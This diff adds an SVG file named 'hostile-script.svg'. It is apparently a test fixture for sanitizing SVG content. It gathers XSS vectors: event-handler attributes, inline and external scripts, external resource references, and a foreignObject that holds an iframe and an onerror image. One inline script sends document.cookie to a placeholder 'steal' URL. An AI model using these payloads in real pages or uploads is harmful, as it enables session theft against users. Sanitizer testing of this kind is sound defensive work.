@@ -1,0 +1,12 @@
+<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" height="200" viewBox="0 0 300 200" onload="alert('onload')">
+  <script>alert('script'); fetch('http://example.com/steal?c=' + document.cookie);</script>
+  <script xlink:href="http://example.com/evil.js"/>
+  <rect width="300" height="200" fill="#ffe0e0" onclick="alert('click')" onmouseover="alert('hover')"/>
+  <image href="http://example.com/x.png" x="10" y="10" width="80" height="80"/>
+  <image xlink:href="https://example.com/y.png" x="100" y="10" width="80" height="80"/>
+  <rect x="190" y="10" width="100" height="80" style="fill: url(http://example.com/pattern.svg#p)"/>
+  <foreignObject x="10" y="100" width="280" height="90">
+    <div xmlns="http://www.w3.org/1999/xhtml"><iframe src="http://example.com/"></iframe><img src="http://example.com/z.png" onerror="alert('img')"/>HTML inside</div>
+  </foreignObject>
+  <text x="150" y="190" text-anchor="middle" font-size="14" fill="#900">hostile-script.svg</text>
+</svg>
